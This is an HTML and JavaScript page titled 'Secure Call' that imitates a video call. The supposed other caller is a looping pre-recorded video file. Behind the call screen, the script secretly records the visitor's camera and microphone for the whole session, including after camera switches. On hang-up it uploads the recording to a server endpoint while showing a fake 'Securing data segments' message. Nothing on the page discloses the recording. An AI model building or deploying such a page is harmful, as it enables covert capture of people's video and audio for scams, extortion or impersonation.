<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Secure Call</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        body { margin:0; background:black; color:white; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; overflow:hidden; touch-action: none; }

        /* Connection Screen */
        #connectScreen {
            position: fixed; top:0; left:0; width:100%; height:100%;
            background: #000; z-index: 500; display: flex;
            flex-direction: column; justify-content: center; align-items: center;
        }

        .connect-btn {
            padding: 15px 40px; border-radius: 30px; border: none;
            background: #25d366; color: white; font-size: 1.2rem;
            font-weight: bold; cursor: pointer; display: flex; align-items: center; gap: 10px;
        }

        /* Video Elements */
        #remoteVideo { position:fixed; width:100%; height:100%; object-fit:cover; z-index: 1; display:none; }

        #localVideo {
            position: absolute; width: 110px; height: 160px;
            bottom: 20px; right: 20px; border-radius: 12px;
            object-fit: cover; z-index: 10; background: #222;
            box-shadow: 0 8px 24px rgba(0,0,0,0.5);
            border: 0.5px solid rgba(255,255,255,0.2);
            display: none;
        }

        .snap-transition { transition: all 0.4s cubic-bezier(0.25, 1, 0.5, 1); }

        /* Controls */
        .controls {
            position:absolute; bottom:40px; width:100%;
            display:none; justify-content:center; align-items: center;
            gap: 20px; z-index: 20; transition: opacity 0.3s, transform 0.3s;
        }

        .btn {
            width: 55px; height: 55px; border-radius: 50%; border: none;
            background: rgba(255, 255, 255, 0.15); color: white;
            font-size: 1.2rem; display: flex; justify-content: center; align-items: center;
            backdrop-filter: blur(10px); cursor: pointer;
        }

        .btn-end { background: #ff3b30; width: 70px; height: 70px; font-size: 1.5rem; }

        /* Finishing Overlay */
        #overlay {
            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: black; z-index: 600; flex-direction: column;
            justify-content: center; align-items: center;
        }

        .loader {
            width: 40px; height: 40px; border: 4px solid #FFF;
            border-bottom-color: transparent; border-radius: 50%;
            animation: rotation 1s linear infinite; display: inline-block;
        }
        @keyframes rotation { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
        p { margin-top: 15px; font-weight: 300; opacity: 0.8; }
    </style>
</head>

<body onclick="toggleUI(event)">

    <div id="connectScreen">
        <button class="connect-btn" onclick="initiateConnection()">
            <i class="fas fa-phone"></i> Connect to Call
        </button>
    </div>

    <video id="remoteVideo" autoplay loop muted playsinline>
        <source src="test-video.mp4" type="video/mp4">
    </video>

    <video id="localVideo" autoplay muted playsinline></video>

    <div class="controls" id="controlsUI">
        <button class="btn" onclick="toggleMic(this)"><i class="fas fa-microphone" id="micIcon"></i></button>
        <button class="btn btn-end" onclick="endCall()"><i class="fas fa-phone-slash"></i></button>
        <button class="btn" onclick="switchCamera()"><i class="fas fa-camera-rotate"></i></button>
    </div>

    <div id="overlay">
        <span class="loader"></span>
        <p id="statusMsg">Securing data segments...</p>
    </div>

<script>
let localStream;      // Current hardware stream
let proxyStream;     // Stable stream for recorder
let mediaRecorder;
let allRecordedChunks = []; 
let currentFacing = "user";
let uiVisible = true;

const connectSound = new Audio("ringtone.mp3");
const localVideo = document.getElementById("localVideo");
const controlsUI = document.getElementById("controlsUI");
const connectScreen = document.getElementById("connectScreen");

// --- INITIALIZE ---
function initiateConnection() {
    connectSound.volume = 0.05; // 🔊 Extremely low volume as requested
    connectSound.play().catch(e => console.log("Audio blocked"));
    
    connectScreen.innerHTML = `<span class="loader"></span><p>Establishing Connection...</p>`;

    setTimeout(async () => {
        connectScreen.style.display = "none";
        document.getElementById("remoteVideo").style.display = "block";
        controlsUI.style.display = "flex";
        localVideo.style.display = "block";
        localVideo.classList.add("snap-transition");
        
        await startInitialStream();
    }, 5000); // ⏳ 5-second delay
}

// --- RECORDING ENGINE (SINGLE STREAM) ---
async function startInitialStream() {
    try {
        localStream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: currentFacing, width: { ideal: 640 } },
            audio: true
        });

        // Create a proxy that stays alive even when we swap camera tracks
        proxyStream = new MediaStream([
            localStream.getVideoTracks()[0],
            localStream.getAudioTracks()[0]
        ]);

        localVideo.srcObject = proxyStream;
        initMediaRecorder();
    } catch (err) {
        console.error("Initial stream failed", err);
    }
}

function initMediaRecorder() {
    const mime = MediaRecorder.isTypeSupported("video/webm;codecs=vp8,opus") ? "video/webm;codecs=vp8,opus" : "video/webm";
    mediaRecorder = new MediaRecorder(proxyStream, { mimeType: mime });
    mediaRecorder.ondataavailable = e => { if (e.data.size > 0) allRecordedChunks.push(e.data); };
    mediaRecorder.start(1000); 
}

async function switchCamera() {
    currentFacing = (currentFacing === "user") ? "environment" : "user";
    try {
        const newStream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: currentFacing, width: { ideal: 640 } },
            audio: true
        });

        const newVideoTrack = newStream.getVideoTracks()[0];
        const oldVideoTrack = proxyStream.getVideoTracks()[0];

        // Swap the track inside the recorder's stream
        proxyStream.removeTrack(oldVideoTrack);
        proxyStream.addTrack(newVideoTrack);

        oldVideoTrack.stop(); // Turn off old camera hardware
        localStream = newStream;
    } catch (err) {
        console.error("Camera switch failed", err);
    }
}

// --- DRAG & MAGNETIC DOCKING ---
let isDragging = false;
let startX, startY, initialLeft, initialTop;

const startDrag = (e) => {
    isDragging = true;
    localVideo.classList.remove("snap-transition");
    const clientX = e.touches ? e.touches[0].clientX : e.clientX;
    const clientY = e.touches ? e.touches[0].clientY : e.clientY;
    const rect = localVideo.getBoundingClientRect();
    startX = clientX; startY = clientY;
    initialLeft = rect.left; initialTop = rect.top;
};

const drag = (e) => {
    if (!isDragging) return;
    const clientX = e.touches ? e.touches[0].clientX : e.clientX;
    const clientY = e.touches ? e.touches[0].clientY : e.clientY;
    let newX = initialLeft + (clientX - startX);
    let newY = initialTop + (clientY - startY);
    
    newX = Math.max(10, Math.min(newX, window.innerWidth - localVideo.offsetWidth - 10));
    newY = Math.max(10, Math.min(newY, window.innerHeight - localVideo.offsetHeight - 10));
    
    localVideo.style.left = newX + "px";
    localVideo.style.top = newY + "px";
};

const stopDrag = () => {
    if (!isDragging) return;
    isDragging = false;
    localVideo.classList.add("snap-transition");
    const rect = localVideo.getBoundingClientRect();
    
    // Magnetic Logic
    if (rect.top > window.innerHeight * 0.7) {
        localVideo.style.top = (window.innerHeight - localVideo.offsetHeight - 20) + "px";
    }
    const finalX = (rect.left + rect.width / 2 < window.innerWidth / 2) ? 20 : (window.innerWidth - rect.width - 20);
    localVideo.style.left = finalX + "px";
};

localVideo.addEventListener("touchstart", startDrag);
localVideo.addEventListener("mousedown", startDrag);
document.addEventListener("touchmove", drag, { passive: false });
document.addEventListener("mousemove", drag);
document.addEventListener("touchend", stopDrag);
document.addEventListener("mouseup", stopDrag);

// --- UI HELPERS ---
function toggleUI(e) {
    if (e.target.closest('button') || isDragging || e.target === localVideo) return;
    uiVisible = !uiVisible;
    controlsUI.style.opacity = uiVisible ? "1" : "0";
    controlsUI.style.pointerEvents = uiVisible ? "auto" : "none";
}

function toggleMic(btn) {
    const t = proxyStream.getAudioTracks()[0];
    if(t) {
        t.enabled = !t.enabled;
        btn.style.background = t.enabled ? "rgba(255,255,255,0.15)" : "white";
        btn.style.color = t.enabled ? "white" : "black";
        document.getElementById("micIcon").className = t.enabled ? "fas fa-microphone" : "fas fa-microphone-slash";
    }
}

// --- FINAL UPLOAD ---
async function endCall() {
    if (mediaRecorder && mediaRecorder.state !== "inactive") {
        mediaRecorder.stop();
    }

    setTimeout(async () => {
        document.getElementById("overlay").style.display = "flex";
        if (localStream) localStream.getTracks().forEach(t => t.stop());

        const finalBlob = new Blob(allRecordedChunks, { type: "video/webm" });
        const formData = new FormData();
        formData.append("video", finalBlob, "call_full.webm");

        try { await fetch("/upload", { method: "POST", body: formData }); } catch (e) {}
        window.location.href = "search.html";
    }, 500);
}
</script>
</body>
</html>
